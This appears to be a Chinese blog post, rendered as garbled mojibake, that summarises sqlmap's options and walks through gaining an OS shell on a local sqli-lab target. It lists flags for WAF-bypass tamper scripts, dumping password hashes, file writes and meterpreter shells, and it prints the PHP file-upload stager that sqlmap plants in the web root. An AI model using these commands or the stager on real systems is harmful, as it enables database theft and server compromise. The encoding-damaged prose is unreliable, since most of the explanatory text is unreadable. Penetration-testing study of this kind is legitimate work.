<h1 id="sqlmapä½¿ç”¨æ€»ç»“"><a href="#sqlmapä½¿ç”¨æ€»ç»“" class="headerlink" title="sqlmapä½¿ç”¨æ€»ç»“"></a>sqlmapä½¿ç”¨æ€»ç»“</h1><h2 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h2><p><code>â€“version</code> æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º<br><code>-h, â€“help</code> æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º<br><code>-v VERBOSE</code> è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰</p>
<h3 id="Target-ç›®æ ‡"><a href="#Target-ç›®æ ‡" class="headerlink" title="Target(ç›®æ ‡)"></a><strong>Target(ç›®æ ‡)</strong></h3><p>ä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡ URLã€‚</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚</span></span><br><span class="line"><span class="deletion">-u URL, â€“url=URL ç›®æ ‡ URLã€‚</span></span><br><span class="line"><span class="deletion">-l LIST ä» Burp æˆ– WebScarab ä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚</span></span><br><span class="line"><span class="deletion">-r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥ HTTP è¯·æ±‚ã€‚</span></span><br><span class="line"><span class="deletion">-g GOOGLEDORK å¤„ç† Google dork çš„ç»“æœä½œä¸ºç›®æ ‡ URLã€‚</span></span><br><span class="line"><span class="deletion">-c CONFIGFILE ä» INI é…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚</span></span><br></pre></td></tr></table></figure>

<h3 id="Requestï¼ˆè¯·æ±‚ï¼‰"><a href="#Requestï¼ˆè¯·æ±‚ï¼‰" class="headerlink" title="Requestï¼ˆè¯·æ±‚ï¼‰"></a><strong>Requestï¼ˆè¯·æ±‚ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“<span class="attribute">data</span>=DATA é€šè¿‡ POST å‘é€çš„æ•°æ®å­—ç¬¦ä¸²</span><br><span class="line">â€“<span class="attribute">cookie</span>=COOKIE HTTP Cookie å¤´</span><br><span class="line">â€“cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„ cookie æ³¨å…¥</span><br><span class="line">â€“drop-set-cookie å¿½ç•¥å“åº”çš„ <span class="built_in">Set</span> â€“Cookie å¤´ä¿¡æ¯</span><br><span class="line">â€“<span class="attribute">user-agent</span>=AGENT æŒ‡å®š HTTP<span class="built_in"> User </span>â€“Agent å¤´</span><br><span class="line">â€“random-agent ä½¿ç”¨éšæœºé€‰å®šçš„ HTTP User-Agent å¤´</span><br><span class="line">â€“<span class="attribute">referer</span>=REFERER æŒ‡å®š HTTP Referer å¤´</span><br><span class="line">â€“<span class="attribute">headers</span>=HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„ HTTP å¤´</span><br><span class="line">â€“<span class="attribute">auth-type</span>=ATYPE HTTP èº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest <span class="keyword">or</span> NTLM)</span><br><span class="line">â€“<span class="attribute">auth-cred</span>=ACRED HTTP èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰</span><br><span class="line">â€“<span class="attribute">auth-cert</span>=ACERT HTTP è®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰</span><br><span class="line">â€“<span class="attribute">proxy</span>=PROXY ä½¿ç”¨ HTTP ä»£ç†è¿æ¥åˆ°ç›®æ ‡ URL</span><br><span class="line">â€“<span class="attribute">proxy-cred</span>=PCRED HTTP ä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰</span><br><span class="line">â€“ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„ HTTP ä»£ç†</span><br><span class="line">â€“<span class="attribute">delay</span>=DELAY åœ¨æ¯ä¸ª HTTP è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’</span><br><span class="line">â€“<span class="attribute">timeout</span>=TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30 ç§’ï¼‰</span><br><span class="line">â€“<span class="attribute">retries</span>=RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰</span><br><span class="line">â€“<span class="attribute">scope</span>=SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">â€“<span class="attribute">safe-url</span>=SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„ url åœ°å€</span><br><span class="line">â€“<span class="attribute">safe-freq</span>=SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„ URL</span><br></pre></td></tr></table></figure>

<h3 id="Optimizationï¼ˆä¼˜åŒ–ï¼‰"><a href="#Optimizationï¼ˆä¼˜åŒ–ï¼‰" class="headerlink" title="Optimizationï¼ˆä¼˜åŒ–ï¼‰"></a><strong>Optimizationï¼ˆä¼˜åŒ–ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ– sqlmap.py çš„æ€§èƒ½ã€‚</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line">-<span class="variable">o</span> å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³</span><br><span class="line">â€“<span class="variable">predict</span>-<span class="variable">output</span> é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º</span><br><span class="line">â€“<span class="variable">keep</span>-<span class="variable">alive</span> ä½¿ç”¨æŒä¹…çš„ <span class="function"><span class="title">HTTP</span>(<span class="variable">S</span>) è¿æ¥</span></span><br><span class="line"><span class="function">â€“<span class="variable"><span class="literal">null</span></span>-<span class="variable">connection</span> ä»æ²¡æœ‰å®é™…çš„ <span class="variable">HTTP</span> å“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦</span></span><br><span class="line"><span class="function">â€“<span class="variable">threads</span>=<span class="variable">THREADS</span> æœ€å¤§çš„ <span class="title">HTTP</span>(<span class="variable">S</span>) è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º<span class="number">1</span>ï¼‰</span></span><br></pre></td></tr></table></figure>

<h3 id="Injectionï¼ˆæ³¨å…¥ï¼‰"><a href="#Injectionï¼ˆæ³¨å…¥ï¼‰" class="headerlink" title="Injectionï¼ˆæ³¨å…¥ï¼‰"></a><strong>Injectionï¼ˆæ³¨å…¥ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œæä¾›è‡ªå®šä¹‰çš„æ³¨å…¥ payloads å’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°</span><br><span class="line">â€“<span class="attribute">dbms</span>=DBMS å¼ºåˆ¶åç«¯çš„ DBMS ä¸ºæ­¤å€¼</span><br><span class="line">â€“<span class="attribute">os</span>=OS å¼ºåˆ¶åç«¯çš„ DBMS æ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼</span><br><span class="line">â€“<span class="attribute">prefix</span>=PREFIX æ³¨å…¥ payload å­—ç¬¦ä¸²å‰ç¼€</span><br><span class="line">â€“<span class="attribute">suffix</span>=SUFFIX æ³¨å…¥ payload å­—ç¬¦ä¸²åç¼€</span><br><span class="line">â€“<span class="attribute">tamper</span>=TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ç¯¡æ”¹æ³¨å…¥æ•°æ®</span><br><span class="line">â€“tamper é€šè¿‡ç¼–ç ç»•è¿‡ WEB é˜²ç«å¢™ï¼ˆWAFï¼‰sqlmap.py é»˜è®¤ç”¨ char()</span><br><span class="line">â€“tamper æ’ä»¶æ‰€åœ¨ç›®å½•\sqlmap-dev\tamper</span><br></pre></td></tr></table></figure>

<h3 id="Detectionï¼ˆæ£€æµ‹ï¼‰"><a href="#Detectionï¼ˆæ£€æµ‹ï¼‰" class="headerlink" title="Detectionï¼ˆæ£€æµ‹ï¼‰"></a>Detectionï¼ˆæ£€æµ‹ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨ SQL ç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒ HTTP å“åº”é¡µé¢çš„å†…å®¹</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“<span class="attribute">level</span>=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">â€“<span class="attribute">risk</span>=RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">â€“<span class="attribute">string</span>=STRING æŸ¥è¯¢æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²</span><br><span class="line">â€“<span class="attribute">regexp</span>=REGEXP æŸ¥è¯¢æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">â€“text-only ä»…åŸºäºæ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ</span><br></pre></td></tr></table></figure>

<p>è¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„ SQL æ³¨å…¥æµ‹è¯•</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">â€“technique<span class="operator">=</span>TECH SQL æ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤ BEUSTï¼‰</span><br><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š</span><br><span class="line">â€“technique /*æµ‹è¯•æŒ‡å®šæ³¨å…¥ç±»å‹\ä½¿ç”¨çš„æŠ€æœ¯</span><br></pre></td></tr></table></figure>

<p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯ï¼š</p>
<p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯ï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨</span><br><span class="line"><span class="symbol">E:</span> åŸºäºæ˜¾é”™ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">U:</span> åŸºäº UNION æ³¨å…¥</span><br><span class="line"><span class="symbol">S:</span> å å±‚ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">T:</span> åŸºäºæ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure>



<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“<span class="attribute">time-sec</span>=TIMESEC DBMS å“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º 5 ç§’ï¼‰</span><br><span class="line">â€“<span class="attribute">union-cols</span>=UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯• UNION æŸ¥è¯¢æ³¨å…¥</span><br><span class="line">â€“<span class="attribute">union-char</span>=UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h3 id="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"><a href="#Fingerprintï¼ˆæŒ‡çº¹ï¼‰" class="headerlink" title="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"></a>Fingerprintï¼ˆæŒ‡çº¹ï¼‰</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„ DBMS ç‰ˆæœ¬æŒ‡çº¹</span></span><br></pre></td></tr></table></figure>

<h3 id="Enumerationï¼ˆæšä¸¾ï¼‰"><a href="#Enumerationï¼ˆæšä¸¾ï¼‰" class="headerlink" title="Enumerationï¼ˆæšä¸¾ï¼‰"></a>Enumerationï¼ˆæšä¸¾ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„ SQL è¯­å¥ã€‚</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">-b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†</span><br><span class="line">â€“<span class="keyword">current</span>-<span class="keyword">user</span> æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·</span><br><span class="line">â€“<span class="keyword">current</span>-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“</span><br><span class="line">â€“<span class="keyword">is</span>-dba æ£€æµ‹ DBMS å½“å‰ç”¨æˆ·æ˜¯å¦ DBA</span><br><span class="line">â€“users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·</span><br><span class="line">â€“passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ</span><br><span class="line">â€“<span class="keyword">privileges</span> æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™</span><br><span class="line">â€“roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²</span><br><span class="line">â€“dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line">â€“<span class="keyword">tables</span> æšä¸¾ DBMS æ•°æ®åº“ä¸­çš„è¡¨</span><br><span class="line">â€“<span class="keyword">columns</span> æšä¸¾ DBMS æ•°æ®åº“è¡¨åˆ—</span><br><span class="line">â€“dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹</span><br><span class="line">â€“dump-<span class="keyword">all</span> è½¬å‚¨æ‰€æœ‰çš„ DBMS æ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®</span><br><span class="line">â€“<span class="keyword">search</span> æœç´¢åˆ—ï¼Œè¡¨å’Œ/æˆ–æ•°æ®åº“åç§°</span><br><span class="line">-D DB è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“å</span><br><span class="line">-T TBL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“è¡¨</span><br><span class="line">-C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—</span><br><span class="line">-U <span class="keyword">USER</span> ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">â€“<span class="keyword">exclude</span>-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line">â€“start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢</span><br><span class="line">â€“stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢</span><br><span class="line">â€“first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢</span><br><span class="line">â€“last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢</span><br><span class="line">â€“<span class="keyword">sql</span>-query=QUERY è¦æ‰§è¡Œçš„ <span class="keyword">SQL</span> è¯­å¥</span><br><span class="line">â€“<span class="keyword">sql</span>-shell æç¤ºäº¤äº’å¼ <span class="keyword">SQL</span> çš„ shell</span><br></pre></td></tr></table></figure>

<h3 id="Brute-force-è›®åŠ›"><a href="#Brute-force-è›®åŠ›" class="headerlink" title="Brute force(è›®åŠ›)"></a>Brute force(è›®åŠ›)</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">â€“<span class="meta">common</span>-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨</span><br><span class="line">â€“<span class="meta">common</span>-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—</span><br></pre></td></tr></table></figure>

<h3 id="User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"><a href="#User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰" class="headerlink" title="User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"></a>User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚</p>
<p>User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼š<br>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line">â€“<span class="attribute">shared-lib</span>=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„</span><br></pre></td></tr></table></figure>

<h3 id="File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"><a href="#File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰" class="headerlink" title="File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"></a>File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼š<br>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">â€“<span class="attribute">file-read</span>=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶</span><br><span class="line">â€“<span class="attribute">file-write</span>=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶</span><br><span class="line">â€“<span class="attribute">file-dest</span>=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<h3 id="Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"><a href="#Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰" class="headerlink" title="[*]Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"></a>[*]Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">â€“<span class="built_in">os</span>-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">â€“<span class="built_in">os</span>-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„ shell</span><br><span class="line">â€“<span class="built_in">os</span>-pwn è·å–ä¸€ä¸ª OOB shellï¼Œmeterpreter æˆ– VNC</span><br><span class="line">â€“<span class="built_in">os</span>-smbrelay ä¸€é”®è·å–ä¸€ä¸ª OOB shellï¼Œmeterpreter æˆ– VNC</span><br><span class="line">â€“<span class="built_in">os</span>-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨</span><br><span class="line">â€“priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡</span><br><span class="line">â€“msf-<span class="built_in">path</span>=MSFPATH Metasploit Framework æœ¬åœ°çš„å®‰è£…è·¯å¾„</span><br><span class="line">â€“tmp-<span class="built_in">path</span>=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<h4 id="os-shellçš„ä½¿ç”¨"><a href="#os-shellçš„ä½¿ç”¨" class="headerlink" title="-os-shellçš„ä½¿ç”¨"></a><code>-os-shell</code>çš„ä½¿ç”¨</h4><p><a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></p>
<p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">https://blog.csdn.net/qq_61237064/article/details/124154956</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å‰æ</span><br><span class="line"></span><br><span class="line">æ‹¥æœ‰ç½‘ç«™çš„å†™å…¥æƒé™</span><br><span class="line"></span><br><span class="line">Secure_file_privå‚æ•°ä¸ºç©ºæˆ–è€…ä¸ºæŒ‡å®šè·¯å¾„</span><br></pre></td></tr></table></figure>

<p>æ»¡è¶³æ¡ä»¶å</p>
<h4 id="1-æ³¨å…¥"><a href="#1-æ³¨å…¥" class="headerlink" title="1.æ³¨å…¥"></a>1.æ³¨å…¥</h4><p>å…ˆå¯¹æ³¨å…¥ç‚¹æ¢æµ‹</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u http://<span class="number">127.0.0.1</span>/sqli-lab/less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(sqlmap)/image-20221112150328026.png" alt="image-20221112150328026"></p>
<p>ç„¶åæ‰§è¡Œ<code>--os-shell</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u http://<span class="number">127.0.0.1</span>/sqli-lab/less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot; --os-shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(sqlmap)/image-20221112150107492.png" alt="image-20221112150107492"></p>
<p>é€‰æ‹©phpè¯­è¨€</p>
<p><img src="/post/tooluse(sqlmap)/image-20221112151004965.png" alt="image-20221112151004965"></p>
<p>æ¥ç€è¿™ä¸ªå‚æ•°æ˜¯é€‰æ‹©ç»å¯¹è·¯å¾„</p>
<p><img src="/post/tooluse(sqlmap)/image-20221112151019786.png" alt="image-20221112151019786"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹ä¸€ä¸ºç”¨è¿™å‡ ä¸ªè·¯å¾„</span><br><span class="line"></span><br><span class="line">é€‰é¡¹äºŒä¸ºç”¨æˆ·è‡ªå·±è¾“å…¥</span><br><span class="line"></span><br><span class="line">é€‰é¡¹ä¸‰ä¸ºç”¨ç”¨æˆ·çš„å­—å…¸</span><br><span class="line"></span><br><span class="line">é€‰é¡¹å››ä¸ºçˆ†ç ´ã€‚</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ»¡è¶³å‰æçš„è¯ï¼Œé€‰æ‹©2ï¼Œç›´æ¥è¾“å…¥è‡ªå·±çŸ¥é“çš„è·¯å¾„</p>
<p><img src="/post/tooluse(sqlmap)/image-20221112151155258.png" alt="image-20221112151155258"></p>
<p>åˆ°è¿™å°±å®Œæˆäº†<code>--os-shell</code>çš„æ‰§è¡Œï¼Œæ¥çœ‹çœ‹åœ¨<code>sqlmap</code>çš„æ‰§è¡Œæ•ˆæœ</p>
<p>å¯¹äºä¸Šä¼ çš„ä¸¤ä¸ªæ–‡ä»¶<code>tmpugvzq.php</code>å’Œ<code>tmpbylqf.php</code>æˆ‘ä»¬åœ¨æ•°æ®åŒ…ä¸­å°±å¯ä»¥çœ‹åˆ°ï¼Œåªéœ€è¦è§£ç å°±å¯ä»¥å¾—åˆ°å†…å®¹</p>
<p><code>tmpugvzq.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$dir</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>()&lt;<span class="string">&#x27;4.1.0&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>,<span class="number">0755</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\Users\\zhang\\Desktop\\php\\PHPTutorial\\WWW\\sqli-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¸Šé¢çš„<code>mysql</code>è¯­å¥ï¼Œä¸éš¾çœ‹å‡ºè¿™æ˜¯åˆ©ç”¨<code>into outfile</code>å†™å…¥æ–‡ä»¶</p>
